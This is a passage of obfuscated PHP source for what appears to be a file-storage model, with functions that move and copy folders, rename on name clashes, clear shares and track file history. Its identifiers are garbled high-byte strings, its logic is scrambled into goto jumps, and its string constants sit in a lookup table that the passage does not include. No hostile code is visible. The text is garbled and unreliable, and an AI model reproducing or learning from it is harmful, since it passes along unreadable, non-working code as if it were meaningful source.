dêÖ–³¹ëê: $Eç‹ñ‡¿‡ =& $_SERVER[¼€¼ˆ¦‚¡]; $bÉÄˆçê = array($Eç‹ñ‡¿‡[461] => $B¨âòƒµÑË, $Eç‹ñ‡¿‡[397] => $this->targetIsDelete); $A“õÎ³¡¿Á = $this->where($bÉÄˆçê)->select(); goto Cù‘Ò—Òì†; aåÉ¸–¿¸ò: foreach ($CÏ¾Äİ†–¤ as $B¨âòƒµÑË => $e‡¬ëÈ©£„) { $this->_childrenItemCache[$B¨âòƒµÑË] = $e‡¬ëÈ©£„; } return $CÏ¾Äİ†–¤; goto AÔÁ­ªõ•; Cù‘Ò—Òì†: $A“õÎ³¡¿Á = $A“õÎ³¡¿Á ? $A“õÎ³¡¿Á : array(); $CÏ¾Äİ†–¤ = array_to_keyvalue($A“õÎ³¡¿Á, $Eç‹ñ‡¿‡[369]); $this->_childrenListCache[$B¨âòƒµÑË] = $CÏ¾Äİ†–¤; goto aåÉ¸–¿¸ò; AÔÁ­ªõ•: } private function fileNameExistCache($C»Úª×Öå¼, $bİÂÔÍ ÉÎ) { $bàì¢ÄÆõƒ =& $_SERVER[¼€¼ˆ¦‚¡]; $bİÂÔÍ ÉÎ = strtolower($bİÂÔÍ ÉÎ); $D¸¨ÎÒ‘½õ = $this->_childrenList($C»Úª×Öå¼); foreach ($D¸¨ÎÒ‘½õ as $e²¦’÷©å) { if ($bİÂÔÍ ÉÎ == strtolower($e²¦’÷©å[$bàì¢ÄÆõƒ[28]])) { return $e²¦’÷©å[$bàì¢ÄÆõƒ[369]]; } } return !1; } private function fileNameAutoCache($F†¢Óˆï, $d‹í÷Ò¯îİ, $Bš‘Ÿòì£á, $dÎ²»õê»–) { $b™Ö¤½á =& $_SERVER[¼€¼ˆ¦‚¡]; $eóÀİº¦…¾ = $this->_childrenList($F†¢Óˆï); $AöÊÊÒ«¶³ = array_to_keyvalue($eóÀİº¦…¾, $b™Ö¤½á[33], $b™Ö¤½á[28]); return $this->fileNameAutoGet($AöÊÊÒ«¶³, $d‹í÷Ò¯îİ, $Bš‘Ÿòì£á, $dÎ²»õê»–); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($bµ‹Æ—ëÃ¨, $AˆÇ–‚¾´, $Eòé„Á¸ÒÍ = REPEAT_REPLACE, $CÂÇ²ñ°Ä = '') { goto Eò•‹ö³¹…; EÄšÚÂÎÏÊ: if ($E„âÆ‰º›Ê[$aİÚàÀ¡†Å[461]] == $C­‘²Ÿ’íŸ[$aİÚàÀ¡†Å[369]]) { if ($E„âÆ‰º›Ê[$aİÚàÀ¡†Å[397]] == $aİÚàÀ¡†Å[83]) { Model($aİÚàÀ¡†Å[395])->restore(array($bµ‹Æ—ëÃ¨)); } return $bµ‹Æ—ëÃ¨; } $b•°Æ ¨ß“ = $this->pathInfoMore($bµ‹Æ—ëÃ¨); if ($this->isParentOf($bµ‹Æ—ëÃ¨, $AˆÇ–‚¾´)) { return !1; } goto dÏŠÉ”“ïÒ; D£ÔÖÜÏŠà: $this->folderSizeReset($AˆÇ–‚¾´); $AªÒ’¥½ÑÈ = array($E„âÆ‰º›Ê[$aİÚàÀ¡†Å[461]], $AˆÇ–‚¾´); if ($E„âÆ‰º›Ê[$aİÚàÀ¡†Å[370]] == $aİÚàÀ¡†Å[83]) { $AªÒ’¥½ÑÈ[] = $bµ‹Æ—ëÃ¨; } goto EòÎè“šÎ¥; eÂ»™İ†ãˆ: if ($E„âÆ‰º›Ê[$aİÚàÀ¡†Å[370]] == $aİÚàÀ¡†Å[83] && $f¬Òİ˜™¾) { $this->folderSizeResetChildren($f¢¬ªŠôŞÄ); } Model($aİÚàÀ¡†Å[167])->linkAdd($f±â£„´•©[$aİÚàÀ¡†Å[501]]); if ($f¬Òİ˜™¾ && $f±â£„´•©[$aİÚàÀ¡†Å[533]]) { $this->removeNow($bµ‹Æ—ëÃ¨, !1); } goto d­ŸÛ™Š¦¸; c©ÂÁàÍ˜Ë: $this->lockWriteStart($AˆÇ–‚¾´, $d¯—³‘’Ë); $f±â£„´•© = array($aİÚàÀ¡†Å[501] => array(), $aİÚàÀ¡†Å[533] => !1); $this->clearShare($bµ‹Æ—ëÃ¨, $AˆÇ–‚¾´); goto Cƒ¼ëğåÁß; dÏŠÉ”“ïÒ: if (!$E„âÆ‰º›Ê || !$C­‘²Ÿ’íŸ || $C­‘²Ÿ’íŸ[$aİÚàÀ¡†Å[370]] != $aİÚàÀ¡†Å[83]) { return !1; } Hook::trigger($aİÚàÀ¡†Å[531], $b•°Æ ¨ß“); $this->targetIsDelete = intval($E„âÆ‰º›Ê[$aİÚàÀ¡†Å[397]]); goto eè÷‡Êì”ù; D¿ˆÈ“—Ü: return $f¢¬ªŠôŞÄ; goto b‹‚îï»–; EòÎè“šÎ¥: $this->updateModifyTime($AªÒ’¥½ÑÈ); Model($aİÚàÀ¡†Å[505])->eventMove($bµ‹Æ—ëÃ¨, $E„âÆ‰º›Ê[$aİÚàÀ¡†Å[461]], $AˆÇ–‚¾´); Hook::trigger($aİÚàÀ¡†Å[532], $b•°Æ ¨ß“); goto D¿ˆÈ“—Ü; d­ŸÛ™Š¦¸: $this->lockMoveEnd($bµ‹Æ—ëÃ¨); $this->lockWriteEnd($AˆÇ–‚¾´, $d¯—³‘’Ë); $this->folderSizeReset($E„âÆ‰º›Ê[$aİÚàÀ¡†Å[461]]); goto D£ÔÖÜÏŠà; Cƒ¼ëğåÁß: $f¬Òİ˜™¾ = $this->fileNameExistCache($AˆÇ–‚¾´, $E„âÆ‰º›Ê[$aİÚàÀ¡†Å[28]]); $f¢¬ªŠôŞÄ = $this->_move($bµ‹Æ—ëÃ¨, $AˆÇ–‚¾´, $Eòé„Á¸ÒÍ, $f±â£„´•©, $CÂÇ²ñ°Ä); $this->sourceCacheClear(); goto eÂ»™İ†ãˆ; eè÷‡Êì”ù: if ($E„âÆ‰º›Ê[$aİÚàÀ¡†Å[461]] == $AˆÇ–‚¾´ && $CÂÇ²ñ°Ä != $E„âÆ‰º›Ê[$aİÚàÀ¡†Å[28]]) { $eµ¯öïŠß¢ = $this->fileNameExist($AˆÇ–‚¾´, $CÂÇ²ñ°Ä); if ($eµ¯öïŠß¢ && $E„âÆ‰º›Ê[$aİÚàÀ¡†Å[370]] == $aİÚàÀ¡†Å[468]) { goto D¦Û•¦¿®ò; Få±ÊÛ‘Ç‹: return $eµ¯öïŠß¢; goto e”«‰Â¢–; Fš‹„Å“ìİ: $this->removeNow($bµ‹Æ—ëÃ¨, !1); $this->folderSizeReset($AˆÇ–‚¾´); Hook::trigger($aİÚàÀ¡†Å[532], $b•°Æ ¨ß“); goto Få±ÊÛ‘Ç‹; D¦Û•¦¿®ò: $bÃ‡…¾”´¬ = $this->sourceInfo($eµ¯öïŠß¢); $D¤ˆ‰ÏéÆ¾ = $this->fileHistory($bÃ‡…¾”´¬, $E„âÆ‰º›Ê[$aİÚàÀ¡†Å[419]], $E„âÆ‰º›Ê[$aİÚàÀ¡†Å[77]]); if (!$D¤ˆ‰ÏéÆ¾) { Model($aİÚàÀ¡†Å[422])->remove($E„âÆ‰º›Ê[$aİÚàÀ¡†Å[419]]); } goto Fš‹„Å“ìİ; e”«‰Â¢–: } } $d¯—³‘’Ë = $CÂÇ²ñ°Ä ? $CÂÇ²ñ°Ä : $E„âÆ‰º›Ê[$aİÚàÀ¡†Å[28]]; $this->lockMoveStart($bµ‹Æ—ëÃ¨); goto c©ÂÁàÍ˜Ë; Eò•‹ö³¹…: $aİÚàÀ¡†Å =& $_SERVER[¼€¼ˆ¦‚¡]; $E„âÆ‰º›Ê = $this->sourceInfo($bµ‹Æ—ëÃ¨); $C­‘²Ÿ’íŸ = $this->sourceInfo($AˆÇ–‚¾´); goto EÄšÚÂÎÏÊ; b‹‚îï»–: } private function _move($eÙ©øù¸Šƒ, $A‡–¶–¸ñ, $C‡¦é¥“§, &$cë³Õõ¬‘Ò, $BÈè«‹¸ = '') { goto bÎ·Ó‡§Ö; EÔÀÀ£Üò: $this->lockWriteStart($A‡–¶–¸ñ, $B•½áŒÒË); if (!$Dæ†×½§‰à) { return $this->_moveForce($eÙ©øù¸Šƒ, $A‡–¶–¸ñ, $B•½áŒÒË); } $DßèƒÜÃîê = $Dæ†×½§‰à; goto AŸ¬ôˆ«Ó; fàã…¨‚¥‡: $B•½áŒÒË = $BÈè«‹¸ ? $BÈè«‹¸ : $cË‘´áÙÂÊ[$d‡’ˆÑ´Ç[28]]; $Dæ†×½§‰à = $this->fileNameExistCache($A‡–¶–¸ñ, $B•½áŒÒË); $this->lockMoveStart($eÙ©øù¸Šƒ); goto EÔÀÀ£Üò; bÎ·Ó‡§Ö: $d‡’ˆÑ´Ç =& $_SERVER[¼€¼ˆ¦‚¡]; $cË‘´áÙÂÊ = $this->sourceInfo($eÙ©øù¸Šƒ); $E­Ó£î×¡„ = $cË‘´áÙÂÊ[$d‡’ˆÑ´Ç[370]] == $d‡’ˆÑ´Ç[83]; goto fàã…¨‚¥‡; bõã÷«Ï†ˆ: return $DßèƒÜÃîê; goto F‚Ğ¬¢öó‰; AŸ¬ôˆ«Ó: $aë“ˆŞñ = !1; if ($E­Ó£î×¡„) { if ($C‡¦é¥“§ == REPEAT_RENAME_FOLDER) { $B•½áŒÒË = $this->fileNameAuto($A‡–¶–¸ñ, $B•½áŒÒË, $C‡¦é¥“§, $E­Ó£î×¡„); $DßèƒÜÃîê = $this->_moveForce($eÙ©øù¸Šƒ, $A‡–¶–¸ñ, $B•½áŒÒË); } else { if ($C‡¦é¥“§ == REPEAT_RENAME_FOLDER) { $C‡¦é¥“§ = REPEAT_RENAME; } $c¢…»Œëã = $this->_childrenListSelect($eÙ©øù¸Šƒ); foreach ($c¢…»Œëã as $eœ†šÅ¯°Ü) { $this->_move($eœ†šÅ¯°Ü[$d‡’ˆÑ´Ç[369]], $Dæ†×½§‰à, $C‡¦é¥“§, $cë³Õõ¬‘Ò); } $aë“ˆŞñ = !0; } } else { if ($C‡¦é¥“§ == REPEAT_SKIP) { $aë“ˆŞñ = !0; } else { if ($C‡¦é¥“§ == REPEAT_RENAME || $C‡¦é¥“§ == REPEAT_RENAME_FOLDER) { $B•½áŒÒË = $this->fileNameAuto($A‡–¶–¸ñ, $B•½áŒÒË, $C‡¦é¥“§, $E­Ó£î×¡„); $DßèƒÜÃîê = $this->_moveForce($eÙ©øù¸Šƒ, $A‡–¶–¸ñ, $B•½áŒÒË); } else { if ($C‡¦é¥“§ == REPEAT_REPLACE) { $e³©ŠÎ’† = $this->sourceInfoCache($Dæ†×½§‰à); $bºÑ÷©§˜¶ = $this->fileHistory($e³©ŠÎ’†, $cË‘´áÙÂÊ[$d‡’ˆÑ´Ç[419]], $cË‘´áÙÂÊ[$d‡’ˆÑ´Ç[77]]); if ($bºÑ÷©§˜¶) { $cë³Õõ¬‘Ò[$d‡’ˆÑ´Ç[501]][] = $cË‘´áÙÂÊ[$d‡’ˆÑ´Ç[419]]; } else { $aë“ˆŞñ = !0; } } } } } if ($aë“ˆŞñ && !$cë³Õõ¬‘Ò[$d‡’ˆÑ´Ç[533]]) { $cë³Õõ¬‘Ò[$d‡’ˆÑ´Ç[533]] = !0; } goto bõã÷«Ï†ˆ; F‚Ğ¬¢öó‰: } private function _moveForce($b–Ë·ÎËôŒ, $F…Ä’Á«Ÿ», $A§ŒÜ±²£Û) { goto Fß°ŞŒÙäÅ; Fß°ŞŒÙäÅ: $DÉÆó×‹äª =& $_SERVER[¼€¼ˆ¦‚¡]; $Fæ§ùŞ–óÅ = $this->sourceInfo($b–Ë·ÎËôŒ); $EÈ–â §˜¸ = $this->sourceInfo($F…Ä’Á«Ÿ»); goto a†´³”Ê•¹; Dƒ¸™¢ÇĞÒ: if (!$eç”î·°„˜) { Model($DÉÆó×‹äª[454])->authClear($b–Ë·ÎËôŒ); } $aŠ£¡„Ñ…£ = $Fæ§ùŞ–óÅ[$DÉÆó×‹äª[397]] == $DÉÆó×‹äª[83] && $EÈ–â §˜¸[$DÉÆó×‹äª[397]] != $DÉÆó×‹äª[83]; if ($aŠ£¡„Ñ…£) { $eÂšÛË“Ï[$DÉÆó×‹äª[396]] = 0; } goto dæ¿¾‡™”†; a†´³”Ê•¹: $FÑ‹ğµÓ¬¥ = $Fæ§ùŞ–óÅ[$DÉÆó×‹äª[370]] == $DÉÆó×‹äª[83]; $eÂšÛË“Ï = array($DÉÆó×‹äª[368] => $EÈ–â §˜¸[$DÉÆó×‹äª[369]], $DÉÆó×‹äª[525] => $EÈ–â §˜¸[$DÉÆó×‹äª[459]] . $EÈ–â §˜¸[$DÉÆó×‹äª[369]] . $DÉÆó×‹äª[47], $DÉÆó×‹äª[521] => $EÈ–â §˜¸[$DÉÆó×‹äª[371]], $DÉÆó×‹äª[522] => $EÈ–â §˜¸[$DÉÆó×‹äª[456]], $DÉÆó×‹äª[524] => USER_ID, $DÉÆó×‹äª[386] => $A§ŒÜ±²£Û); $eç”î·°„˜ = $Fæ§ùŞ–óÅ[$DÉÆó×‹äª[371]] == SourceModel::TYPE_GROUP && $EÈ–â §˜¸[$DÉÆó×‹äª[371]] == SourceModel::TYPE_GROUP && $Fæ§ùŞ–óÅ[$DÉÆó×‹äª[456]] == $EÈ–â §˜¸[$DÉÆó×‹äª[456]]; goto Dƒ¸™¢ÇĞÒ; dæ¿¾‡™”†: if ($FÑ‹ğµÓ¬¥) { $b«É£¹°å› = array($DÉÆó×‹äª[525] => array($DÉÆó×‹äª[483], $Fæ§ùŞ–óÅ[$DÉÆó×‹äª[459]] . $Fæ§ùŞ–óÅ[$DÉÆó×‹äª[369]] . $DÉÆó×‹äª[484])); $bÍœÄ¦Üº = $Fæ§ùŞ–óÅ[$DÉÆó×‹äª[459]] . $Fæ§ùŞ–óÅ[$DÉÆó×‹äª[369]] . $DÉÆó×‹äª[47]; $Dä±—õ„¿ = $EÈ–â §˜¸[$DÉÆó×‹äª[459]] . $EÈ–â §˜¸[$DÉÆó×‹äª[369]] . $DÉÆó×‹äª[47] . $Fæ§ùŞ–óÅ[$DÉÆó×‹äª[369]] . $DÉÆó×‹äª[47]; $DÃÌ·íêÇ = array($DÉÆó×‹äª[525] => array($DÉÆó×‹äª[534], "\162\x65\160\x6c\x61\x63\145\x28\160\141\162\x65\156\x74\114\x65\166\145\x6c\x2c\47{$bÍœÄ¦Üº}\x27\x2c\x27{$Dä±—õ„¿}\47\51"), $DÉÆó×‹äª[521] => $EÈ–â §˜¸[$DÉÆó×‹äª[371]], $DÉÆó×‹äª[522] => $EÈ–â §˜¸[$DÉÆó×‹äª[456]]); if ($aŠ£¡„Ñ…£) { $DÃÌ·íêÇ[$DÉÆó×‹äª[396]] = 0; } $this->where($b«É£¹°å›)->data($DÃÌ·íêÇ)->save(); } $this->where(array($DÉÆó×‹äª[383] => $b–Ë·ÎËôŒ))->data($eÂšÛË“Ï)->save(); return $b–Ë·ÎËôŒ; goto eê¿ˆ…«ª; eê¿ˆ…«ª: } private function clearShare($A‘Ú ÈÈÍ, $f¸ÇÃß—ñ) { goto Eíé×„¡æÖ; EŞÍÈÎÛ³…: if ($Eâ‚ÆŠå©[$c¥“œªÇˆ[456]] == $E¡÷Ö÷ù÷Œ[$c¥“œªÇˆ[456]] && $Eâ‚ÆŠå©[$c¥“œªÇˆ[371]] == $c¥“œªÇˆ[535]) { return; } $dôÎÈ»à¢Î = array($c¥“œªÇˆ[459] => array($c¥“œªÇˆ[483], $Eâ‚ÆŠå©[$c¥“œªÇˆ[459]] . $A‘Ú ÈÈÍ . $c¥“œªÇˆ[484])); $f¤‚‡ÖïêÊ = $this->field($c¥“œªÇˆ[383])->where($dôÎÈ»à¢Î)->getField($c¥“œªÇˆ[369], !0); goto dğáŒÌ†ŒÖ; ağÍÑÉÂ İ: if (!$ašáÌš³Å ) { return; } $ašáÌš³Å  = array_to_keyvalue($ašáÌš³Å , $c¥“œªÇˆ[33], $c¥“œªÇˆ[441]); $dôÎÈ»à¢Î = array($c¥“œªÇˆ[441] => array($c¥“œªÇˆ[7], $ašáÌš³Å )); goto dËµÚ„´š; Eíé×„¡æÖ: $c¥“œªÇˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $Eâ‚ÆŠå© = $this->sourceInfo($A‘Ú ÈÈÍ); $E¡÷Ö÷ù÷Œ = $this->sourceInfo($f¸ÇÃß—ñ); goto EŞÍÈÎÛ³…; dğáŒÌ†ŒÖ: if (!$f¤‚‡ÖïêÊ) { return; } $dôÎÈ»à¢Î = array($c¥“œªÇˆ[369] => array($c¥“œªÇˆ[7], $f¤‚‡ÖïêÊ), $c¥“œªÇˆ[448] => 1); $ašáÌš³Å  = Model($c¥“œªÇˆ[536])->field($c¥“œªÇˆ[441])->where($dôÎÈ»à¢Î)->select(); goto ağÍÑÉÂ İ; dËµÚ„´š: Model($c¥“œªÇˆ[536])->where($dôÎÈ»à¢Î)->save(array($c¥“œªÇˆ[448] => 0)); Model($c¥“œªÇˆ[537])->where($dôÎÈ»à¢Î)->delete(); goto fÓ¯ã–âî‡; fÓ¯ã–âî‡: } public function copyFolderFromIO($EËÓ®İéé, $F¤¯ËóˆºÇ, $A—±ÖŠŒ‘, $Bè«ğñÄù, $Aâ÷ÎÜŠš®, $eíÁ°Â´ = false) { goto a’í»¶×‘¢; a’í»¶×‘¢: $E¨…°İ¾ =& $_SERVER[¼€¼ˆ¦‚¡]; $a½§Ş†÷ƒÛ = array($E¨…°İ¾[502] => array(), $E¨…°İ¾[503] => array(), $E¨…°İ¾[501] => array(), $E¨…°İ¾[538] => array()); $f èÒ‘­öÍ = $eíÁ°Â´ ? $eíÁ°Â´ : $EËÓ®İéé->getPathName($EËÓ®İéé->pathThis($F¤¯ËóˆºÇ)); goto c½œöíÔ©æ; eÎíÏë‚­¬: Hook::trigger($E¨…°İ¾[540]); if ($b°®š£ŸÉ) { $this->folderSizeResetChildren($b°®š£ŸÉ); } $this->_childrenListClear(); goto C§¯óò‘„Í; c½œöíÔ©æ: $FŠñ«ÊŠÈŸ = $this->fileNameExist($A—±ÖŠŒ‘, $f èÒ‘­öÍ); $b°®š£ŸÉ = $this->mkdir($A—±ÖŠŒ‘, $f èÒ‘­öÍ, $Bè«ğñÄù); if (!$FŠñ«ÊŠÈŸ || $Bè«ğñÄù == REPEAT_RENAME_FOLDER) { $Bè«ğñÄù = !1; } goto C‰Šéƒå›; C§¯óò‘„Í: Model($E¨…°İ¾[504])->addAll($a½§Ş†÷ƒÛ[$E¨…°İ¾[502]], array(), !0); Model($E¨…°İ¾[505])->eventCopy($b°®š£ŸÉ); $this->saveAll($a½§Ş†÷ƒÛ[$E¨…°İ¾[503]]); goto cÌ­ÆĞ…›²; cÌ­ÆĞ…›²: Model($E¨…°İ¾[422])->linkAdd($a½§Ş†÷ƒÛ[$E¨…°İ¾[501]]); Model($E¨…°İ¾[422])->remove($a½§Ş†÷ƒÛ[$E¨…°İ¾[538]]); $this->folderSizeReset($A—±ÖŠŒ‘); goto f’šÀ£’; C‰Šéƒå›: if ($FŠñ«ÊŠÈŸ) { $this->_childrenAllMake($FŠñ«ÊŠÈŸ); } Hook::trigger($E¨…°İ¾[539]); $this->_copyChildTo($EËÓ®İéé, $F¤¯ËóˆºÇ, $b°®š£ŸÉ, $Bè«ğñÄù, $a½§Ş†÷ƒÛ, $Aâ÷ÎÜŠš®); goto eÎíÏë‚­¬; f’šÀ£’: $this->updateModifyTime($A—±ÖŠŒ‘); return $b°®š£ŸÉ; goto A­·ä£Ì¿¶; A­·ä£Ì¿¶: } private function _copyChildTo($aÅ»¦¿ëŒ, $dˆÁ»–Ÿ‰ø, $c³ó¼—ôâÚ, $F°™¸î“¥, &$eóö¦Å‹‘ö, $aÎ£ŞÃÓÑ) { goto FÏ¢ŠÏêš; AÎùŸÁËÂ: $Bíï¹æîª = array_merge($C¤…Á£â·[$FáàÔåÖÄĞ[73]], $C¤…Á£â·[$FáàÔåÖÄĞ[74]]); $Bì¸Çáóœ = $this->_addFiles($aÅ»¦¿ëŒ, $C¤…Á£â·[$FáàÔåÖÄĞ[73]], $aÎ£ŞÃÓÑ); $f·ùŞ‘Ô¡Ç = array(); goto aù£Ú¥”–; BÛé×ÀÕ£Ì: $fäãÜÔ›™ = $this->_childrenList($c³ó¼—ôâÚ); $fäãÜÔ›™ = array_to_keyvalue($fäãÜÔ›™, $FáàÔåÖÄĞ[28]); foreach ($Bíï¹æîª as $e¸ ´©é¤Õ) { $fƒ´¾ùã­“ = $fäãÜÔ›™[$e¸ ´©é¤Õ[$FáàÔåÖÄĞ[28]]]; $aÀÃƒåãšš = $fƒ´¾ùã­“[$FáàÔåÖÄĞ[369]]; $this->_copyApplyMeta($fƒ´¾ùã­“, $eóö¦Å‹‘ö); if ($e¸ ´©é¤Õ[$FáàÔåÖÄĞ[29]] == $FáàÔåÖÄĞ[76]) { $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[75]] = $aÅ»¦¿ëŒ->getPathInner($e¸ ´©é¤Õ[$FáàÔåÖÄĞ[75]]); $this->_copyChildTo($aÅ»¦¿ëŒ, $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[75]], $aÀÃƒåãšš, $F°™¸î“¥, $eóö¦Å‹‘ö, $aÎ£ŞÃÓÑ); } } goto cÇ¡¯ğ¤; aù£Ú¥”–: foreach ($Bíï¹æîª as &$e¸ ´©é¤Õ) { goto fÈ¨ó¥ó‘¡; fÈ¨ó¥ó‘¡: if (isset($Bì¸Çáóœ[$e¸ ´©é¤Õ[$FáàÔåÖÄĞ[28]]])) { $e¸ ´©é¤Õ = $Bì¸Çáóœ[$e¸ ´©é¤Õ[$FáàÔåÖÄĞ[28]]]; } $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[370]] = $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[29]] == $FáàÔåÖÄĞ[76]; $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[372]] = _get($e¸ ´©é¤Õ, $FáàÔåÖÄĞ[160], $FáàÔåÖÄĞ[33]); goto fÜèõåˆ˜; f¾ë„›åÜó: if ($F°™¸î“¥) { $DÔÚ¯ù°„ó = $this->fileNameExistCache($c³ó¼—ôâÚ, $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[28]]); if ($DÔÚ¯ù°„ó) { if ($e¸ ´©é¤Õ[$FáàÔåÖÄĞ[370]] || $F°™¸î“¥ == REPEAT_SKIP) { continue; } if ($F°™¸î“¥ == REPEAT_REPLACE) { $fƒ´¾ùã­“ = $this->sourceInfoCache($DÔÚ¯ù°„ó); $eà¿ğ¬àÌÅ = $this->fileHistory($fƒ´¾ùã­“, $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[419]], $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[77]]); if ($eà¿ğ¬àÌÅ) { $eóö¦Å‹‘ö[$FáàÔåÖÄĞ[501]][] = $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[419]]; } continue; } else { if ($F°™¸î“¥ == REPEAT_RENAME) { $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[28]] = $this->fileNameAutoCache($c³ó¼—ôâÚ, $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[28]], $F°™¸î“¥, !1); } } } } if (!$e¸ ´©é¤Õ[$FáàÔåÖÄĞ[370]] && $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[419]]) { $eóö¦Å‹‘ö[$FáàÔåÖÄĞ[501]][] = $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[419]]; } $f·ùŞ‘Ô¡Ç[] = $this->_makeItemData($e¸ ´©é¤Õ, $bÚî¼‚É¶, $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[28]]); goto AéŠÙãíò; fÜèõåˆ˜: $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[77]] = _get($e¸ ´©é¤Õ, $FáàÔåÖÄĞ[77], 0); $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[419]] = _get($e¸ ´©é¤Õ, $FáàÔåÖÄĞ[419], 0); if (!isset($e¸ ´©é¤Õ[$FáàÔåÖÄĞ[541]]) && $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[419]]) { $eóö¦Å‹‘ö[$FáàÔåÖÄĞ[538]][] = $e¸ ´©é¤Õ[$FáàÔåÖÄĞ[419]]; } goto f¾ë„›åÜó; AéŠÙãíò: } unset($e¸ ´©é¤Õ); if (!empty($f·ùŞ‘Ô¡Ç)) { $this->addAll($f·ùŞ‘Ô¡Ç); } goto BÛé×ÀÕ£Ì; FÏ¢ŠÏêš: $FáàÔåÖÄĞ =& $_SERVER[¼€¼ˆ¦‚¡]; $bÚî¼‚É¶ = $this->sourceInfoCache($c³ó¼—ôâÚ); $C¤…Á£â· = $aÅ»¦¿ëŒ->listPath($dˆÁ»–Ÿ‰ø, !1, !0); goto AÎùŸÁËÂ; cÇ¡¯ğ¤: } private function _addFiles($A¶©ñâŸ, $CŒ‰†¾çÙ™, $a­ÅÙ“ğˆÜ) { goto D“ó¬‚ì˜•; eÛ£´õá¯: $fé¡´¬ÚŠÂ = $b›¼›ì†¼->where($bº„¦¿Ì–ç)->select(); $fé¡´¬ÚŠÂ = $fé¡´¬ÚŠÂ ? $fé¡´¬ÚŠÂ : array(); foreach ($fé¡´¬ÚŠÂ as $B§‘éî»ó) { if (!isset($c§…»²ëš[$B§‘éî»ó[$DÙ•µ¢šØë[163]]])) { continue; } $e™áÛ”óõÈ = $c§…»²ëš[$B§‘éî»ó[$DÙ•µ¢šØë[163]]]; foreach ($e™áÛ”óõÈ as &$bñèª˜®·É) { $bñèª˜®·É[$DÙ•µ¢šØë[419]] = $B§‘éî»ó[$DÙ•µ¢šØë[419]]; $bñèª˜®·É[$DÙ•µ¢šØë[541]] = !0; } unset($bñèª˜®·É); } goto cŠÇ©‰»»; D¡­ˆÊÜŞñ: foreach ($CŒ‰†¾çÙ™ as &$bñèª˜®·É) { goto eê‹£„æë; EÍ×•­ö¬Ñ: $bñèª˜®·É[$DÙ•µ¢šØë[163]] = $d³¤®Š¶Ô; Hook::trigger($DÙ•µ¢šØë[543], $bñèª˜®·É); $c§…»²ëš[$d³¤®Š¶Ô][] =& $bñèª˜®·É; goto cÃâ‹á‚Ë; eê‹£„æë: Hook::trigger($DÙ•µ¢šØë[542], $bñèª˜®·É); $bñèª˜®·É[$DÙ•µ¢šØë[75]] = $A¶©ñâŸ->getPathInner($bñèª˜®·É[$DÙ•µ¢šØë[75]]); $F»³í¶£Ïº = $A¶©ñâŸ->hashSimple($bñèª˜®·É[$DÙ•µ¢šØë[75]]); goto Aó”ĞšãˆÄ; Aó”ĞšãˆÄ: $d³¤®Š¶Ô = $A¶©ñâŸ->hashMd5($bñèª˜®·É[$DÙ•µ¢šØë[75]]); if (strlen($d³¤®Š¶Ô) > 10 && !isset($c§…»²ëš[$d³¤®Š¶Ô])) { $c§…»²ëš[$d³¤®Š¶Ô] = array(); } $bñèª˜®·É[$DÙ•µ¢šØë[164]] = $F»³í¶£Ïº; goto EÍ×•­ö¬Ñ; cÃâ‹á‚Ë: if (count($c§…»²ëš[$d³¤®Š¶Ô]) > 1) { $bñèª˜®·É[$DÙ•µ¢šØë[541]] = !0; } goto DÕ”³®›…®; DÕ”³®›…®: } $bº„¦¿Ì–ç = array($DÙ•µ¢šØë[163] => array($DÙ•µ¢šØë[7], array_keys($c§…»²ëš))); $b›¼›ì†¼ = Model($DÙ•µ¢šØë[544]); goto eÛ£´õá¯; C£æİ–Ä: $bº„¦¿Ì–ç = array($DÙ•µ¢šØë[163] => array($DÙ•µ¢šØë[7], array_keys($c§…»²ëš))); $fé¡´¬ÚŠÂ = $b›¼›ì†¼->where($bº„¦¿Ì–ç)->select(); $fé¡´¬ÚŠÂ = $fé¡´¬ÚŠÂ ? $fé¡´¬ÚŠÂ : array(); goto bé„Â÷…âµ; bé„Â÷…âµ: foreach ($fé¡´¬ÚŠÂ as $B§‘éî»ó) { if (!isset($c§…»²ëš[$B§‘éî»ó[$DÙ•µ¢šØë[163]]])) { continue; } $D»Ô®ƒ†Ï =& $c§…»²ëš[$B§‘éî»ó[$DÙ•µ¢šØë[163]]]; foreach ($D»Ô®ƒ†Ï as &$bñèª˜®·É) { $bñèª˜®·É[$DÙ•µ¢šØë[419]] = $B§‘éî»ó[$DÙ•µ¢šØë[419]]; } unset($bñèª˜®·É); } $CÃ³‡œ•™— = array(); foreach ($CŒ‰†¾çÙ™ as $Eˆ‡Œ”‘µ) { $CÃ³‡œ•™—[$Eˆ‡Œ”‘µ[$DÙ•µ¢šØë[28]]] = $Eˆ‡Œ”‘µ; } goto FÄËì±Œóë; FÄËì±Œóë: return $CÃ³‡œ•™—; goto aÊŒ½ƒù; cŠÇ©‰»»: $F†ÆØ—›º« = array(); foreach ($CŒ‰†¾çÙ™ as $C—†š˜ğˆê) { if (isset($C—†š˜ğˆê[$DÙ•µ¢šØë[541]]) && $C—†š˜ğˆê[$DÙ•µ¢šØë[541]]) { continue; } $C¶ôÙ´Ù = $A¶©ñâŸ->getPathInner($C—†š˜ğˆê[$DÙ•µ¢šØë[75]]); $D‘Á—áçÛå = $b›¼›ì†¼->addFileMake($C¶ôÙ´Ù, $C—†š˜ğˆê[$DÙ•µ¢šØë[77]], $C—†š˜ğˆê[$DÙ•µ¢šØë[164]], $C—†š˜ğˆê[$DÙ•µ¢šØë[163]], $C—†š˜ğˆê[$DÙ•µ¢šØë[28]], $a­ÅÙ“ğˆÜ); $F†ÆØ—›º«[] = $D‘Á—áçÛå; } $b›¼›ì†¼->addAll($F†ÆØ—›º«); goto C£æİ–Ä; D“ó¬‚ì˜•: 